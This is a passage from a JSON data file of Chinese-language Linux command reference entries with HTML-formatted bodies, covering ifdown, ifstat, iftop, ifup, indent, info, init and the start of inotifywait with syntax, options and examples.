class=\"language-shell\">ifconfig   <span class=\"hljs-comment\">#处于激活状态的网络接口</span>\nifconfig -<span class=\"hljs-keyword\">a</span>  <span class=\"hljs-comment\">#所有配置的网络接口，不论其是否激活</span>\nifconfig eth0  <span class=\"hljs-comment\">#显示eth0的网卡信息</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ifdown",
        "des": "禁用指定的网络接口",
        "body": "<h1 id=\"ifdown\">ifdown</h1>\n<p>禁用指定的网络接口</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ifdown命令</strong> 用于禁用指定的网络接口。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ifdown</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>网络接口：要禁用的网络接口。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ifdown</span> eth0  <span class=\"hljs-comment\">#禁用eth0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ifstat",
        "des": "统计网络接口流量状态",
        "body": "<h1 id=\"ifstat\">ifstat</h1>\n<p>统计网络接口流量状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ifstat命令</strong> 就像iostat/vmstat描述其它的系统状况一样，是一个统计网络接口活动状态的工具。ifstat工具系统中并不默认安装，需要自己下载源码包，重新编译安装，使用过程相对比较简单。</p>\n<h3 id=\"下载\">下载</h3>\n<pre><code class=\"language-shell\">http:<span class=\"hljs-regexp\">//g</span>ael.roualland.free.fr<span class=\"hljs-regexp\">/ifstat/</span>  （官网）\nwget http:<span class=\"hljs-regexp\">//g</span>ael.roualland.free.fr<span class=\"hljs-regexp\">/ifstat/i</span>fstat-<span class=\"hljs-number\">1.1</span>.tar.gz\n</code></pre>\n<h3 id=\"编译安装\">编译安装</h3>\n<pre><code class=\"language-shell\">tar -zxvf ifstat-<span class=\"hljs-number\">1.1</span>.tar.gz\ncd ifstat-<span class=\"hljs-number\">1.1</span>\n./configure            \nmake\nmake install # 默认会安装到<span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/bin/</span>目录中\n</code></pre>\n<p>注释：执行<code>which ifstat</code>输出<code>/usr/local/bin/ifstat</code></p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>l 监测环路网络接口（lo）。缺省情况下，ifstat监测活动的所有非环路网络接口。经使用发现，加上-l参数能监测所有的网络接口的信息，而不是只监测 lo的接口信息，也就是说，加上-l参数比不加-l参数会多一个lo接口的状态信息。\n<span class=\"hljs-literal\">-</span>a 监测能检测到的所有网络接口的状态信息。使用发现，比加上-l参数还多一个plip0的接口信息，搜索一下发现这是并口（网络设备中有一 个叫PLIP (Parallel Line Internet Protocol). 它提供了并口...）\n<span class=\"hljs-literal\">-</span>z 隐藏流量是无的接口，例如那些接口虽然启动了但是未用的\n<span class=\"hljs-literal\">-</span>i 指定要监测的接口,后面跟网络接口名\n<span class=\"hljs-literal\">-</span>s 等于加-d snmp:[comm@][<span class=\"hljs-comment\">#]host[/nn]] 参数，通过SNMP查询一个远程主机</span>\n<span class=\"hljs-literal\">-</span>h 显示简短的帮助信息\n<span class=\"hljs-literal\">-</span>n 关闭显示周期性出现的头部信息（也就是说，不加-n参数运行ifstat时最顶部会出现网络接口的名称，当一屏显示不下时，会再一次出现接口的名称，提示我们显示的流量信息具体是哪个网络接口的。加上-n参数把周期性的显示接口名称关闭，只显示一次）\n<span class=\"hljs-literal\">-</span>t 在每一行的开头加一个时间 戳（能告诉我们具体的时间）\n<span class=\"hljs-literal\">-</span>T 报告所有监测接口的全部带宽（最后一列有个total，显示所有的接口的in流量和所有接口的out流量，简单的把所有接口的in流量相加,out流量相 加）\n<span class=\"hljs-literal\">-</span>w  用指定的列宽，而不是为了适应接口名称的长度而去自动放大列宽\n<span class=\"hljs-literal\">-</span>W 如果内容比终端窗口的宽度还要宽就自动换行\n<span class=\"hljs-literal\">-</span>S 在同一行保持状态更新（不滚动不换行）注：如果不喜欢屏幕滚动则此项非常方便，与bmon的显示方式类似\n<span class=\"hljs-literal\">-</span>b 用kbits/s显示带宽而不是kbytes/s\n<span class=\"hljs-literal\">-</span>q 安静模式，警告信息不出现\n<span class=\"hljs-literal\">-</span>v 显示版本信息\n<span class=\"hljs-literal\">-</span>d 指定一个驱动来收集状态信息\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>默认使用</p>\n<pre><code class=\"language-shell\">[root@localhost ifstat-<span class=\"hljs-number\">1.1</span>] <span class=\"hljs-comment\">#ifstat</span>\n       eth0                eth1       \n KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out\n    <span class=\"hljs-number\">0.07</span>      <span class=\"hljs-number\">0.20</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>\n    <span class=\"hljs-number\">0.07</span>      <span class=\"hljs-number\">0.15</span>      <span class=\"hljs-number\">0.58</span>      <span class=\"hljs-number\">0.00</span>\n</code></pre>\n<p>默认ifstat不监控回环接口，显示的流量单位是KB。</p>\n<pre><code class=\"language-shell\">[root@localhost ifstat-<span class=\"hljs-number\">1.1</span>]<span class=\"hljs-comment\"># ifstat -tT</span>\n  time           eth0                eth1                eth2                eth3               Total      \nHH:MM:ss   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out\n<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">04</span>      <span class=\"hljs-number\">0.84</span>      <span class=\"hljs-number\">0.62</span>   <span class=\"hljs-number\">1256.27</span>   <span class=\"hljs-number\">1173.05</span>      <span class=\"hljs-number\">0.12</span>      <span class=\"hljs-number\">0.18</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>   <span class=\"hljs-number\">1257.22</span>   <span class=\"hljs-number\">1173.86</span>\n<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">05</span>      <span class=\"hljs-number\">0.57</span>      <span class=\"hljs-number\">0.40</span>      <span class=\"hljs-number\">0.57</span>      <span class=\"hljs-number\">0.76</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">1.14</span>      <span class=\"hljs-number\">1.17</span>\n<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">06</span>      <span class=\"hljs-number\">1.58</span>      <span class=\"hljs-number\">0.71</span>      <span class=\"hljs-number\">0.42</span>      <span class=\"hljs-number\">0.78</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">2.01</span>      <span class=\"hljs-number\">1.48</span>\n<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">07</span>      <span class=\"hljs-number\">0.57</span>      <span class=\"hljs-number\">0.40</span>      <span class=\"hljs-number\">1.91</span>      <span class=\"hljs-number\">2.61</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">2.48</span>      <span class=\"hljs-number\">3.01</span>\n<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">08</span>      <span class=\"hljs-number\">0.73</span>      <span class=\"hljs-number\">0.40</span>    <span class=\"hljs-number\">924.02</span>   <span class=\"hljs-number\">1248.91</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>    <span class=\"hljs-number\">924.76</span>   <span class=\"hljs-number\">1249.31</span>\n</code></pre>\n<p>监控所有网络接口</p>\n<pre><code class=\"language-shell\">[root@localhost ifstat-<span class=\"hljs-number\">1.1</span>] <span class=\"hljs-comment\"># ifstat -a</span>\n        lo                 eth0                eth1       \n KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out   KB<span class=\"hljs-regexp\">/s in  KB/</span>s out\n    <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.28</span>      <span class=\"hljs-number\">0.58</span>      <span class=\"hljs-number\">0.06</span>      <span class=\"hljs-number\">0.06</span>\n    <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">1.41</span>      <span class=\"hljs-number\">1.13</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>\n    <span class=\"hljs-number\">0.61</span>      <span class=\"hljs-number\">0.61</span>      <span class=\"hljs-number\">0.26</span>      <span class=\"hljs-number\">0.23</span>      <span class=\"hljs-number\">0.00</span>      <span class=\"hljs-number\">0.00</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "iftop",
        "des": "一款实时流量监控工具",
        "body": "<h1 id=\"iftop\">iftop</h1>\n<p>一款实时流量监控工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iftop命令</strong> 是一款实时流量监控工具，监控TCP/IP连接等，缺点就是无报表功能。必须以root身份才能运行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iftop</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">iftop: <span class=\"hljs-keyword\">display</span> bandwidth usage <span class=\"hljs-keyword\">on</span> <span class=\"hljs-keyword\">an</span> interface <span class=\"hljs-keyword\">by</span> host\n\nSynopsis: iftop -<span class=\"hljs-keyword\">h</span> | [-npblNBP] [-i interface] [-f filter code]\n    [-F <span class=\"hljs-keyword\">net</span>/mask] [-<span class=\"hljs-keyword\">G</span> net6/mask6]\n\n   -<span class=\"hljs-keyword\">h</span>                  <span class=\"hljs-keyword\">display</span> this message\n   -<span class=\"hljs-keyword\">n</span>                  don't <span class=\"hljs-keyword\">do</span> hostname lookups\n   -<span class=\"hljs-keyword\">N</span>                  don't convert port numbers to services\n   -p                  <span class=\"hljs-keyword\">run</span> <span class=\"hljs-keyword\">in</span> promiscuous mode (show traffic between other\n                       hosts <span class=\"hljs-keyword\">on</span> the same network segment)\n   -b                  don't <span class=\"hljs-keyword\">display</span> a bar <span class=\"hljs-keyword\">graph</span> of traffic\n   -B                  <span class=\"hljs-keyword\">Display</span> bandwidth <span class=\"hljs-keyword\">in</span> bytes\n   -i interface        listen <span class=\"hljs-keyword\">on</span> named interface\n   -f filter code      <span class=\"hljs-keyword\">use</span> filter code to select packets to <span class=\"hljs-keyword\">count</span>\n                      (default: none, but only IP packets are counted)\n   -F <span class=\"hljs-keyword\">net</span>/mask         show traffic flows <span class=\"hljs-keyword\">in</span>/<span class=\"hljs-keyword\">out</span> of IPv4 network\n   -<span class=\"hljs-keyword\">G</span> net6/mask6       show traffic flows <span class=\"hljs-keyword\">in</span>/<span class=\"hljs-keyword\">out</span> of IPv6 network\n   -<span class=\"hljs-keyword\">l</span>                  <span class=\"hljs-keyword\">display</span> and <span class=\"hljs-keyword\">count</span> link-<span class=\"hljs-keyword\">local</span> IPv6 traffic (default: off)\n   -P                  show ports <span class=\"hljs-keyword\">as</span> well <span class=\"hljs-keyword\">as</span> hosts\n   -<span class=\"hljs-keyword\">m</span> limit            sets the upper limit <span class=\"hljs-keyword\">for</span> the bandwidth scale\n   -c config <span class=\"hljs-keyword\">file</span>      specifies <span class=\"hljs-keyword\">an</span> alternative configuration <span class=\"hljs-keyword\">file</span>\n   -t                  <span class=\"hljs-keyword\">use</span> text interface without ncurses\n   \n   Sorting orders:\n   -o 2s                <span class=\"hljs-keyword\">Sort</span> <span class=\"hljs-keyword\">by</span> first column (2s traffic average)\n   -o 10s               <span class=\"hljs-keyword\">Sort</span> <span class=\"hljs-keyword\">by</span> second column (10s traffic average) [default]\n   -o 40s               <span class=\"hljs-keyword\">Sort</span> <span class=\"hljs-keyword\">by</span> third column (40s traffic average)\n   -o source            <span class=\"hljs-keyword\">Sort</span> <span class=\"hljs-keyword\">by</span> source address\n   -o destination       <span class=\"hljs-keyword\">Sort</span> <span class=\"hljs-keyword\">by</span> destination address\n   \n   The following options are only available <span class=\"hljs-keyword\">in</span> combination with -t\n   -s num              <span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">one</span> single text output afer num seconds, then quit\n   -<span class=\"hljs-keyword\">L</span> num              number of lines to <span class=\"hljs-keyword\">print</span>\n</code></pre>\n<h3 id=\"界面说明\">界面说明</h3>\n<blockquote>\n<p>第一行为带宽，这里为1Mbit,不是字节哦.\n连接列表，最后三列分别是2秒，10秒和40秒的平均流量\n<code>=&gt;</code> 代表发送<br><code>&lt;=</code> 代表接收\n最后三行表示发送，接收和全部的流量，\n第二列为你运行iftop到目前流量，第三列为高峰值，第四列为平均值。</p>\n</blockquote>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iftop</span>           <span class=\"hljs-comment\"># 默认是监控第一块网卡的流量</span>\niftop -i eth1   <span class=\"hljs-comment\"># 监控eth1</span>\niftop -n        <span class=\"hljs-comment\"># 直接显示IP, 不进行DNS反解析</span>\niftop -N        <span class=\"hljs-comment\"># 直接显示连接埠编号, 不显示服务名称</span>\niftop -F <span class=\"hljs-number\">192.168.1.0</span>/<span class=\"hljs-number\">24</span> or <span class=\"hljs-number\">192.168.1.0</span>/<span class=\"hljs-number\">255.255.255.0</span>  <span class=\"hljs-comment\"># 显示某个网段进出封包流量</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ifup",
        "des": "激活指定的网络接口",
        "body": "<h1 id=\"ifup\">ifup</h1>\n<p>激活指定的网络接口</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ifup命令</strong> 用于激活指定的网络接口。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ifup</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>网络接口：要激活的网络接口。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ifup</span> eth0   <span class=\"hljs-comment\">#激活eth0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "indent",
        "des": "格式化C语言的源文件",
        "body": "<h1 id=\"indent\">indent</h1>\n<p>格式化C语言的源文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>indent命令</strong> 可辨识C的原始代码文件，并加以格式化，以方便程序员阅读、修改等操作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">indent</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(源文件)</span>\n或\n<span class=\"hljs-title\">indent</span>（选项)<span class=\"hljs-params\">(源文件)</span><span class=\"hljs-params\">(-o 目标文件)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-bad：在声明区加上空白行；</span>\n<span class=\"hljs-deletion\">-bap：添加空白行；</span>\n<span class=\"hljs-deletion\">-bbb：在注释后面添加空白行；</span>\n<span class=\"hljs-deletion\">-bc：在声明段中，如果出现逗号就换行；</span>\n<span class=\"hljs-deletion\">-bl：if（或是else、for等）与后面执行区段的“{”不同行，且“}”自成一行-bli&lt;缩排格数&gt;设置{}缩排的格数；</span>\n<span class=\"hljs-deletion\">-br：if（或是else、for等）与后面执行区段的“{”同行，且“}”自成一行；</span>\n<span class=\"hljs-deletion\">-bs：在sizeof之后空一格；</span>\n<span class=\"hljs-deletion\">-c&lt;栏数&gt;：将注释置于程序右侧指定的栏位；</span>\n<span class=\"hljs-deletion\">-cd&lt;栏数&gt;：将注释置于声明右侧指定的栏位；</span>\n<span class=\"hljs-deletion\">-cdb：注释符号自成一行；</span>\n<span class=\"hljs-deletion\">-ce：将else置于“}”（if执行区段的结尾）之后；</span>\n<span class=\"hljs-deletion\">-ci：&lt;缩排格数&gt;：叙述过长而换行时，指定换行后缩排的格数；</span>\n<span class=\"hljs-deletion\">-cli&lt;缩排格数&gt;：使用case时，switch缩排的格数；</span>\n<span class=\"hljs-deletion\">-cp&lt;栏数&gt;：将注释置于else与elseif叙述右侧指定的栏位；</span>\n<span class=\"hljs-deletion\">-cs：在case之后空一格；</span>\n<span class=\"hljs-deletion\">-d&lt;缩排格数&gt;：针对不是放在程序码右侧的注释，设置其缩排格数；</span>\n<span class=\"hljs-deletion\">-di&lt;栏数&gt;：将声明区段的变量置于指定的栏位；</span>\n<span class=\"hljs-deletion\">-fc1：针对放在每行最前端的注释，设置其格式；</span>\n<span class=\"hljs-deletion\">-fca：设置所有注释的格式；</span>\n<span class=\"hljs-deletion\">-gnu：使用指定的GNU格式，该参数为默认值；</span>\n<span class=\"hljs-deletion\">-i&lt;格数&gt;：设置缩排的格数；</span>\n<span class=\"hljs-deletion\">-ip&lt;格数&gt;：设置参数的缩排格数；</span>\n<span class=\"hljs-deletion\">-kr：指定使用Kernighan&amp;Ritchie的格式；</span>\n<span class=\"hljs-deletion\">-lp：叙述过长而换行，且叙述中包含了括号时，将括号中的每行起始栏位内容垂直对其排列；</span>\n<span class=\"hljs-deletion\">-nbad：在声明区段后不要加上空白行；</span>\n<span class=\"hljs-deletion\">-nbap：在程序后面不添加空白行；</span>\n<span class=\"hljs-deletion\">-nbbb：在注释段后面不添加空白行；</span>\n<span class=\"hljs-deletion\">-nbc：在声明段中，即使出现逗号，也不换行；</span>\n<span class=\"hljs-deletion\">-ncdb：注释符号不自成一行；</span>\n<span class=\"hljs-deletion\">-nce：不将else置于“}”后面；</span>\n<span class=\"hljs-deletion\">-ncs：不在case后面空一格；</span>\n<span class=\"hljs-deletion\">-nfc1：不要格式化放在每行最前端的注释；</span>\n<span class=\"hljs-deletion\">-nfca：不用格式化任何的注释；</span>\n<span class=\"hljs-deletion\">-nip：参数不要缩排；</span>\n<span class=\"hljs-deletion\">-nlp：叙述过长而换行，且叙述中包含了括号时，不用将括号中的每行起始栏位垂直对其排列；</span>\n<span class=\"hljs-deletion\">-npcs：在调用函数名之后，不要添加空格；</span>\n<span class=\"hljs-deletion\">-npro：不要读取indent的配置文件“.indent.pro”；</span>\n<span class=\"hljs-deletion\">-npsl：程序类型与程序名称放在同一行；</span>\n<span class=\"hljs-deletion\">-nsc：注释左侧不要添加星号；</span>\n<span class=\"hljs-deletion\">-nsob：不用处理多余的空白行；</span>\n<span class=\"hljs-deletion\">-nss：若for或while区段仅有一行时，在分号前不加空格；</span>\n<span class=\"hljs-deletion\">-nv：不显示详细的信息；</span>\n<span class=\"hljs-deletion\">-orig：使用berkeley格式；</span>\n<span class=\"hljs-deletion\">-pcs：在调用函数名与“{”之间添加空格；</span>\n<span class=\"hljs-deletion\">-psl：程序类型置于程序名称的前一行；</span>\n<span class=\"hljs-deletion\">-sc：在每行注释左侧添加星号；</span>\n<span class=\"hljs-deletion\">-sob：删除多余的空白行；</span>\n<span class=\"hljs-deletion\">-ss：若for或swile区段仅有一行时，在分号前加上空格；</span>\n<span class=\"hljs-deletion\">-st：将结果显示在标准输出设备上；</span>\n<span class=\"hljs-deletion\">-T：数据类型名称缩排；</span>\n<span class=\"hljs-deletion\">-ts&lt;格数&gt;：设置tab的长度；</span>\n<span class=\"hljs-deletion\">-v：显示详细的执行过程；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用indent命令将C语言源文件\"test.c\"中所有的sizeof后面添加一个空格，输入如下命令：</p>\n<pre><code class=\"language-shell\">indent -bs <span class=\"hljs-regexp\">/home/</span>rootlocal<span class=\"hljs-regexp\">/桌面/</span>test.c\n</code></pre>\n<p>执行上面的命令后，用户可以打开指定的源文件查看在sizeof后面是否都添加了一个空格。由于该命令的参数非常多，所以用户可以根据实际需要选择适合的参数进行使用即可。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "info",
        "des": "Linux下info格式的帮助指令",
        "body": "<h1 id=\"info\">info</h1>\n<p>Linux下info格式的帮助指令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>info命令</strong> 是Linux下info格式的帮助指令。</p>\n<p>就内容来说，info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。理解这个命令的窍门就是不仅要学习如何在单独的Info页面中浏览导航，还要学习如何在节点和子节点之间切换。可能刚开始会一时很难在info页面的节点之间移动和找到你要的东西，真是具有讽刺意味：原本以为对于新手来说，某个东西比man命令会更好些，但实际上学习和使用起来更困难。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">info</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：添加包含info格式帮助文档的目录；</span>\n<span class=\"hljs-deletion\">-f：指定要读取的info格式的帮助文档；</span>\n<span class=\"hljs-deletion\">-n：指定首先访问的info帮助文件的节点；</span>\n<span class=\"hljs-deletion\">-o：输出被选择的节点内容到指定文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>帮助主题：指定需要获得帮助的主题，可以是指令、函数以及配置文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>在info后面输入命令的名称就可以查看该命令的info帮助文档了：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">info</span> <span class=\"hljs-built_in\">info</span>\n</code></pre>\n<p>面介绍一下它的几个常用快捷键。</p>\n<pre><code class=\"language-shell\"> <span class=\"hljs-strong\">**?键：**</span> 它就会显示info的常用快捷键。\n <span class=\"hljs-strong\">**N键：**</span> 显示（相对于本节点的）下一节点的文档内容。\n <span class=\"hljs-strong\">**P键：**</span> 显示（相对于本节点的）前一节点的文档内容。\n <span class=\"hljs-strong\">**U键：**</span> 进入当前命令所在的主题。\n <span class=\"hljs-strong\">**M键：**</span> 敲M键后输入命令的名称就可以查看该命令的帮助文档了。\n <span class=\"hljs-strong\">**G键：**</span> 敲G键后输入主题名称，进入该主题。\n <span class=\"hljs-strong\">**L键：**</span> 回到上一个访问的页面。\n <span class=\"hljs-strong\">**SPACE键：**</span> 向前滚动一页。\n <span class=\"hljs-strong\">**BACKUP或DEL键：**</span> 向后滚动一页。\n <span class=\"hljs-strong\">**Q：**</span> 退出info。\n</code></pre>\n<p><strong>命令</strong> </p>\n<pre><code class=\"language-shell\"> **？**      显示帮助窗口\n\n在帮助窗口中：\n **Ctrl-x <span class=\"hljs-number\">0</span>**           关闭帮助窗口\n **Ctrl-x Ctrl-c**     关闭整个 <span class=\"hljs-literal\">Inf</span>o\n\n **q**       退出 <span class=\"hljs-literal\">inf</span>o\n **n**       打开与本 <span class=\"hljs-keyword\">Node</span> <span class=\"hljs-title\">关联的下一个 Node</span>\n **p**       打开与本 <span class=\"hljs-keyword\">Node</span> <span class=\"hljs-title\">关联的前一个 Node</span>\n **u**       打开与本 <span class=\"hljs-keyword\">Node</span> <span class=\"hljs-title\">关联的上一个 Node</span>\n **l**       回到上一次访问的 <span class=\"hljs-keyword\">Node</span>\n <span class=\"hljs-title\">**m</span>或g**    选择一个菜单项（<span class=\"hljs-keyword\">Node</span> <span class=\"hljs-title\">的名字）\n       输入指定菜单的名字后按回车，打开指定菜单项关联的 Node</span>\n **空格键**  下一页（PageDown 也可以，下一页从当前页的最后两行开始算起）\n       下一个 <span class=\"hljs-keyword\">Node</span> <span class=\"hljs-title\">（若当前页在 Node</span> 文档的末尾）\n **Del 键**  上一页（PageUp 也可以，上一页从当前页的开始两行开始算起）\n       上一个 <span class=\"hljs-keyword\">Node</span> <span class=\"hljs-title\">（若当前页 Node</span> 文档的开始）\n\n **b 或 t 或 Home**    文档的开始（b 是 begining 的意思）\n **e 或 End**          文档的末尾（b 是 ending 的意思）\n **Ctrl-l**     刷新当前页，若当前文档显示情况有问题时\n **Ctrl-g**     取消所键入的指令\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "init",
        "des": "init进程是所有Linux进程的父进程",
        "body": "<h1 id=\"init\">init</h1>\n<p>init进程是所有Linux进程的父进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>init命令</strong> 是Linux下的进程初始化工具，init进程是所有Linux进程的父进程，它的进程号为1。init命令是Linux操作系统中不可缺少的程序之一，init进程是Linux内核引导运行的，是系统中的第一个进程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">init</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：不执行相关脚本而直接进入单用户模式；</span>\n<span class=\"hljs-deletion\">-s：切换到单用户模式。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>运行等级：指定Linux系统要切换到的运行等级。</p>\n<h3 id=\"实例\">实例</h3>\n<p>几个常用的命令</p>\n<p>查看系统进程命令：<code>ps -ef | head</code><br>查看init的配置文件：<code>more /etc/inittab</code><br>查看系统当前运行的级别：<code>runlevel</code></p>\n<p> <strong>运行级别</strong> </p>\n<p>到底什么是运行级呢？简单的说，运行级就是操作系统当前正在运行的功能级别。这个级别从0到6 ，具有不同的功能。你也可以在<code>/etc/inittab</code>中查看它的英文介绍。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">#0</span>  停机（千万不能把initdefault 设置为<span class=\"hljs-number\">0</span>）\n<span class=\"hljs-variable\">#1</span>  单用户模式\n<span class=\"hljs-variable\">#2</span>  多用户，没有 NFS(和级别<span class=\"hljs-number\">3</span>相似，会停止部分服务)\n<span class=\"hljs-variable\">#3</span>  完全多用户模式\n<span class=\"hljs-variable\">#4</span>  没有用到\n<span class=\"hljs-variable\">#5</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">11</span>(Xwindow)\n<span class=\"hljs-variable\">#6</span>  重新启动（千万不要把initdefault 设置为<span class=\"hljs-number\">6</span>）\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "inotifywait",
        "des": "异步文件系统监控机制",
        "body": "<h1 id=\"inotifywait\">inotifywait</h1>\n<p>异步文件系统监控机制</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>Inotify</strong> 一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。。</p>\n<p> <strong>inotify-tools</strong> 是一个C库和一组命令行的工作提供Linux下inotify的简单接口。inotify-tools安装后会得到<code>inotifywait</code>和<code>inotifywatch</code>这两条命令：</p>\n<ul>\n<li>   <strong>inotifywait命令</strong> 可以用来收集有关文件访问信息，Linux发行版一般没有包括这个命令，需要安装inotify-tools，这个命令还需要将inotify支持编译入Linux内核，好在大多数Linux发行版都在内核中启用了inotify。</li>\n<li>   <strong>inotifywatch命令</strong> 用于收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。</li>\n</ul>\n<p>开始之前需要检测系统内核是否支持inotify：</p>\n<p>使用<code>uname -r</code>命令检查Linux内核，如果低于2.6.13，就需要重新编译内核加入inotify的支持。</p>\n<p>使用<code>ll /proc/sys/fs/inotify</code>命令，是否有以下三条信息输出，如果没有表示不支持。</p>\n<pre><code class=\"language-shell\">ll /<span class=\"hljs-keyword\">proc</span>/sys/fs/inotify<span class=\"hljs-title\">\ntotal</span> 0\n-rw-r--r-- 1<span class=\"hljs-title\"> root</span> root 0<span class=\"hljs-title\"> Jan</span>  4 15:41<span class=\"hljs-title\"> max_queued_events</span>\n-rw-r--r-- 1<span class=\"hljs-title\"> root</span> root 0<span class=\"hljs-title\"> Jan</span>  4 15:41<span class=\"hljs-title\"> max_user_instances</span>\n-rw-r--r-- 1<span class=\"hljs-title\"> root</span> root 0<span class=\"hljs-title\"> Jan</span>  4 15:41<span class=\"hljs-title\"> max_user_watches</span>\n</code></pre>\n<h3 id=\"安装inotify-tools\">安装inotify-tools</h3>\n<ul>\n<li>  inotify-tools项目地址：<a 